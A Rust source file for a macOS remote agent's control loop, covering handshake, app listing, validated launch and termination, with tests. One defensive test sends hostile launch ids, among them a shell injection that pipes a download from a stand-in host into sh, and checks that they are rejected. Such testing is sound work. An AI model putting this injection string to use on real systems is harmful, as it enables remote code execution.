//! Control-plane loop of the macOS agent. Capture and input injection are NOT
//! implemented here: they depend on the feasibility gate (docs/SPEC.md §2).
//! Until then the agent answers such requests with `CapabilityUnavailable`
//! instead of pretending.

use rm_core::{AppRegistry, ValidatedLaunch};
use rm_protocol::{
    negotiate, read_message, write_message, AppInfo, CapabilityReport, Hello, Message, ProtocolError,
};
use std::collections::HashMap;
use std::io::{Read, Write};

pub trait Launcher {
    fn launch(&mut self, v: &ValidatedLaunch) -> std::io::Result<u32>;
    fn terminate(&mut self, pid: u32) -> std::io::Result<()>;
    fn exists(&self, exe: &std::path::Path) -> bool;
}

/// Spawns the executable directly (argv, no shell).
pub struct ProcessLauncher {
    children: HashMap<u32, std::process::Child>,
}

impl ProcessLauncher {
    pub fn new() -> Self {
        Self { children: HashMap::new() }
    }
}

impl Default for ProcessLauncher {
    fn default() -> Self {
        Self::new()
    }
}

impl Launcher for ProcessLauncher {
    fn launch(&mut self, v: &ValidatedLaunch) -> std::io::Result<u32> {
        std::fs::create_dir_all(&v.cwd)?;
        let child = std::process::Command::new(&v.executable)
            .args(&v.args)
            .current_dir(&v.cwd)
            .envs(&v.env)
            .stdin(std::process::Stdio::null())
            .spawn()?;
        let pid = child.id();
        self.children.insert(pid, child);
        Ok(pid)
    }
    fn terminate(&mut self, pid: u32) -> std::io::Result<()> {
        match self.children.remove(&pid) {
            Some(mut c) => {
                c.kill()?;
                c.wait().map(|_| ())
            }
            None => Ok(()),
        }
    }
    fn exists(&self, exe: &std::path::Path) -> bool {
        exe.exists()
    }
}

pub fn agent_hello() -> Hello {
    let agent = format!("remote-agent {} {} {}", env!("CARGO_PKG_VERSION"), std::env::consts::OS, std::env::consts::ARCH);
    // No codecs advertised: video is not implemented yet.
    Hello::ours(&agent, &[], &["control"])
}

/// Serve one client until EOF. Returns Ok on clean disconnect.
pub fn serve<S: Read + Write>(
    stream: &mut S,
    registry: &AppRegistry,
    caps: &CapabilityReport,
    launcher: &mut dyn Launcher,
) -> Result<(), ProtocolError> {
    let ours = agent_hello();
    let theirs = match read_message(stream)? {
        Some(Message::ClientHello(h)) => h,
        Some(_) => {
            write_message(stream, &Message::Error { code: "expected_hello".into(), message: "first message must be ClientHello".into() })?;
            return Ok(());
        }
        None => return Ok(()),
    };
    if let Err(e) = negotiate(&ours, &theirs) {
        write_message(stream, &Message::Error { code: "version_mismatch".into(), message: e.to_string() })?;
        return Ok(());
    }
    write_message(stream, &Message::ServerHello(ours))?;
    // Handshake is only complete once capabilities are on the wire.
    write_message(stream, &Message::CapabilityReport(caps.clone()))?;

    let mut running: HashMap<String, u32> = HashMap::new();
    while let Some(msg) = read_message(stream)? {
        match msg {
            Message::ListApps => {
                let apps = registry
                    .descriptors()
                    .iter()
                    .map(|d| AppInfo { id: d.id.clone(), name: d.name.clone(), available: launcher.exists(&d.executable), version: None })
                    .collect();
                write_message(stream, &Message::Apps { apps })?;
            }
            Message::AppLaunch { application_id, arguments, working_directory, environment } => {
                let reply = match registry.validate(&application_id, &arguments, working_directory.as_deref(), &environment) {
                    Err(e) => Message::Error { code: "launch_rejected".into(), message: e.to_string() },
                    Ok(v) if !launcher.exists(&v.executable) => {
                        Message::Error { code: "app_not_installed".into(), message: application_id.clone() }
                    }
                    Ok(v) => match launcher.launch(&v) {
                        Ok(pid) => {
                            running.insert(application_id.clone(), pid);
                            Message::AppLaunched { application_id, pid }
                        }
                        Err(e) => Message::Error { code: "launch_failed".into(), message: e.to_string() },
                    },
                };
                write_message(stream, &reply)?;
            }
            Message::AppTerminate { application_id } => {
                let reply = match running.remove(&application_id) {
                    Some(pid) => {
                        let _ = launcher.terminate(pid);
                        Message::AppExited { application_id, code: None }
                    }
                    None => Message::Error { code: "not_running".into(), message: application_id },
                };
                write_message(stream, &reply)?;
            }
            Message::Ping { nonce } => write_message(stream, &Message::Pong { nonce })?,
            Message::MouseMove { .. }
            | Message::MouseButton { .. }
            | Message::Scroll { .. }
            | Message::Key { .. }
            | Message::TextInput { .. } => {
                write_message(
                    stream,
                    &Message::CapabilityUnavailable { capability: "input".into(), reason: "input injection not implemented (pending feasibility gate)".into() },
                )?;
            }
            _ => write_message(stream, &Message::Error { code: "unexpected".into(), message: "message not valid for agent".into() })?,
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use rm_protocol::Capability;
    use std::collections::BTreeMap;
    use std::net::{TcpListener, TcpStream};
    use std::path::PathBuf;

    #[derive(Default)]
    struct Fake {
        launched: Vec<ValidatedLaunch>,
        killed: Vec<u32>,
        installed: bool,
    }
    impl Launcher for Fake {
        fn launch(&mut self, v: &ValidatedLaunch) -> std::io::Result<u32> {
            self.launched.push(ValidatedLaunch { executable: v.executable.clone(), args: v.args.clone(), cwd: v.cwd.clone(), env: v.env.clone() });
            Ok(4242)
        }
        fn terminate(&mut self, pid: u32) -> std::io::Result<()> {
            self.killed.push(pid);
            Ok(())
        }
        fn exists(&self, _: &std::path::Path) -> bool {
            self.installed
        }
    }

    fn run(installed: bool, script: impl FnOnce(&mut TcpStream)) -> Fake {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = l.local_addr().unwrap();
        let t = std::thread::spawn(move || {
            let (mut s, _) = l.accept().unwrap();
            let reg = AppRegistry::default_macos(PathBuf::from("/tmp/rm-test-session"));
            let mut fake = Fake { installed, ..Default::default() };
            serve(&mut s, &reg, &CapabilityReport::unknown("test"), &mut fake).unwrap();
            fake
        });
        let mut c = TcpStream::connect(addr).unwrap();
        script(&mut c);
        drop(c);
        t.join().unwrap()
    }

    fn handshake(c: &mut TcpStream) {
        write_message(c, &Message::ClientHello(Hello::ours("t", &[], &["control"]))).unwrap();
        assert!(matches!(read_message(c).unwrap().unwrap(), Message::ServerHello(_)));
        assert!(matches!(read_message(c).unwrap().unwrap(), Message::CapabilityReport(_)));
    }

    #[test]
    fn handshake_list_launch_terminate() {
        let fake = run(true, |c| {
            handshake(c);
            write_message(c, &Message::ListApps).unwrap();
            match read_message(c).unwrap().unwrap() {
                Message::Apps { apps } => assert!(apps.iter().any(|a| a.id == "textedit" && a.available)),
                m => panic!("{m:?}"),
            }
            write_message(c, &Message::AppLaunch { application_id: "textedit".into(), arguments: vec![], working_directory: None, environment: BTreeMap::new() }).unwrap();
            assert_eq!(read_message(c).unwrap().unwrap(), Message::AppLaunched { application_id: "textedit".into(), pid: 4242 });
            write_message(c, &Message::AppTerminate { application_id: "textedit".into() }).unwrap();
            assert!(matches!(read_message(c).unwrap().unwrap(), Message::AppExited { .. }));
        });
        assert_eq!(fake.launched.len(), 1);
        assert_eq!(fake.killed, vec![4242]);
    }

    #[test]
    fn arbitrary_command_never_launched() {
        let fake = run(true, |c| {
            handshake(c);
            for id in ["/bin/sh", "textedit; curl evil|sh", "bash"] {
                write_message(c, &Message::AppLaunch { application_id: id.into(), arguments: vec![], working_directory: None, environment: BTreeMap::new() }).unwrap();
                match read_message(c).unwrap().unwrap() {
                    Message::Error { code, .. } => assert_eq!(code, "launch_rejected"),
                    m => panic!("{m:?}"),
                }
            }
        });
        assert!(fake.launched.is_empty());
    }

    #[test]
    fn missing_app_reported_not_faked() {
        let fake = run(false, |c| {
            handshake(c);
            write_message(c, &Message::AppLaunch { application_id: "xcode".into(), arguments: vec![], working_directory: None, environment: BTreeMap::new() }).unwrap();
            assert!(matches!(read_message(c).unwrap().unwrap(), Message::Error { ref code, .. } if code == "app_not_installed"));
        });
        assert!(fake.launched.is_empty());
    }

    #[test]
    fn input_reports_unavailable() {
        run(true, |c| {
            handshake(c);
            write_message(c, &Message::TextInput { window_id: 1, text: "x".into() }).unwrap();
            assert!(matches!(read_message(c).unwrap().unwrap(), Message::CapabilityUnavailable { .. }));
        });
    }

    #[test]
    fn rejects_non_hello_first_and_bad_version() {
        run(true, |c| {
            write_message(c, &Message::ListApps).unwrap();
            assert!(matches!(read_message(c).unwrap().unwrap(), Message::Error { ref code, .. } if code == "expected_hello"));
        });
        run(true, |c| {
            let mut h = Hello::ours("t", &[], &[]);
            h.min_version = 99;
            h.max_version = 99;
            write_message(c, &Message::ClientHello(h)).unwrap();
            assert!(matches!(read_message(c).unwrap().unwrap(), Message::Error { ref code, .. } if code == "version_mismatch"));
        });
    }

    #[test]
    fn capability_json_from_probe_parses() {
        // Shape emitted by probe/macos/main.swift
        let j = r#"{"gui_session":{"state":"available","detail":"x"},"capture":{"state":"unavailable","reason":"no TCC"},
                    "input":{"state":"unknown","reason":"r"},"accessibility":{"state":"unavailable","reason":"r"},
                    "hardware_encode":{"state":"available","detail":"h264"}}"#;
        let r: CapabilityReport = serde_json::from_str(j).unwrap();
        assert!(!r.can_stream_apps());
        assert!(matches!(r.capture, Capability::Unavailable { .. }));
    }
}
